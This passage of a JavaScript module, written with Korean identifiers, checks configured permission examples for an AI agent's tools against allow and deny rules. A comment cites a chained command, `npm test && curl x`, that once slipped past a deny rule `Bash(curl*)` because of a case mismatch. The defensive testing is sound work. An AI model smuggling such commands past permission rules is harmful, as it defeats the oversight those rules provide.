 * 대소문자도 안 가린다. 그래도 아는 말이 아니면(`막힘` 따위) 여전히 버린다 — 늘 틀린 것으로
 * 나오는 보기 하나가 확인 전체를 못 믿게 만든다.
 */
const 기대말 = new Map([
  ['allow', 'allow'], ['deny', 'deny'], ['모름', '모름'],
  ['unknown', '모름'], ['ask', '모름'],
]);

/** 설정에 적어 둔 확인 보기들. 없으면 빈 배열. */
export function 확인목록(cfg) {
  const 것 = cfg?.permissions?.확인 ?? cfg?.permissions?.checks;
  if (!Array.isArray(것)) return [];
  const out = [];
  for (const x of 것) {
    if (!x || typeof x !== 'object') continue;
    const 도구 = String(x.도구 ?? x.tool ?? 'Bash');
    const 값 = x.값 ?? x.value;
    const 이래야 = 기대말.get(String(x.이래야 ?? x.expect ?? '').trim().toLowerCase());
    if (typeof 값 !== 'string' || !값) continue;
    if (!이래야) continue;
    out.push({ 도구, 값, 이래야 });
  }
  return out;
}

/**
 * 도구 이름에 맞는 인자 모양으로 값을 싼다.
 *
 * 걸리나() 는 도구마다 다른 칸을 본다 — Bash 는 command, 파일 도구는
 * file_path. 확인 보기에서는 사람이 값 하나만 적으므로, 여기서 그 도구가
 * 보는 칸에 넣어 준다. 안 그러면 보기가 늘 「안 걸림」 으로 나와서, 검사가
 * 아무것도 안 재면서 초록으로 남는다.
 *
 * 도구 이름은 **대소문자를 안 가린다**(같은도구). 싸는 자리만 글자를 그대로 봐서 `bash` 로
 * 적은 보기는 명령이 file_path 로 싸였고, 명령 검사(셸 마디·따옴표·대소문자)를 통째로 안 타서
 * 실제 판정과 다른 답을 냈다 — `bash` + `npm test && curl x` 가 금지 `Bash(curl*)` 앞에서
 * `모름` 이었다(8회차).
 */
export function 확인인자(도구, 값) {
  if (같은도구(도구, 'Bash')) return { command: 값 };
  if (같은도구(도구, 'WebFetch')) return { url: 값 };
  if (같은도구(도구, 'Grep')) return { pattern: 값 };
  return { file_path: 값 };
}

/**
 * 확인 보기를 다 돌린다.
 *
 * @returns {Array<{도구,값,이래야,나온것,맞나,규칙,출처}>}
 */
export function 확인돌리기(규칙들, 보기들) {
  return (보기들 ?? []).map((b) => {
    const r = 어떻게할까(규칙들, b.도구, 확인인자(b.도구, b.값));
    return { ...b, 나온것: r.답, 맞나: r.답 === b.이래야, 규칙: r.규칙, 출처: r.출처 };
  });
}
